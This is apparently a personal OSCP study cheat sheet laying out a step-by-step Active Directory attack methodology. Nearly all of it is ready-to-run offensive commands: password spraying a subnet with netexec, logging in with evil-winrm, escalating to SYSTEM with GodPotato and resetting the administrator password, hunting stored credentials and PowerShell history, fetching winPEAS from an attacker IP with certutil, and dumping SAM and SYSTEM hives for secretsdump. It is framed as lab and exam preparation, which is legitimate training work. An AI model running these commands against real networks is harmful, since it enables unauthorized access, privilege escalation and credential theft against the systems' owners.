# OSCP AD Methodology

## Phase 1 (Assumed Breach) Find and escalate on first machine you have access to.

### Enumerate all machines on the subnet
```bash
netexec smb 10.10.10.0/24 -u john.doe -p 'Welcome1!'
```

* Check for winrm access (Pwn3d! = Shell)
```bash
netexec winrm 10.10.10.0/24 -u john.doe -p 'Welcome1!'
```
* Connect to the machine
```bash
evil-winrm -i 10.10.10.x -u john.doe -p 'Welcome1!'
```
## Phase 2 - Own the First Machine before AD
### Step 1 - Escalate priv's
* Check Priv's
```bash
whoami /priv
```
> Look for SEImpersonatePrivilege. Use [GodPotato](https://github.com/BeichenDream/GodPotato/releases/tag/V1.20) if found.

** GodPotato Test
```bash
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
# Should Output: nt authority/system
```

** GodPotato change local admin password
```bash
.\godpotato-net4.exe -cmd "cmd /c net user administrator password"
```
### Step 2 - Mine for passwords (Living off the land)
* Stored Windows Credentials
```bash
cmdkey /list
```
* Powershell History
```bash
type c:\users\john.doe\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_History.txt
```
* Check powershell history for all users on the system.
* Check config files
```bash
dir /s /b *pass* *cred* *config* *vnc* *.xml 2>nul
```
* Check other users home directories
### Step 3 - Run Winpeas
* Copy winpeas to the system
```bash
certutil -urlcache -f http://(attacker IP):port/winPEASany.exe wp.exe
```
* Run Winpeas
```bash
.\wp.exe
```
Look for:
- SEImpersonatePrivilege - GodPotato
- Unquoted Service Paths - sc exploit
- Writable service binary - replace and restart
- Stored Credentials - cmdkey /list

## Phase 3 - SAM Dump & Hash Spraying
### Scenario A - Shell via evil-winrm
* download the hive files directly to your attacker machine
- Save the SAM and System
```bash
reg save HKLM\SAM sam
reg save HKLM\SYSTEM system
```
- Download in evil-winrm
```bash
download sam
download system
```
- Extract secrets with secretsdump
```bash
impacket-secretsdump LOCAL -sam sam -system system
```
### Scenario B - Windows.old found on the machine
> windows.old contains a copy of the sam and system in a completely unprotected state.

* Find the old SAM and SYSTEM
```bash
dir C:\Windows.old\Windows\System32\
```
* extract same as above with secretsdump

### Credits
[Got Root?](https://infosecwriteups.com/how-i-attacked-active-directory-during-oscp-labs-and-what-tools-actually-worked-8a10e12930a4)
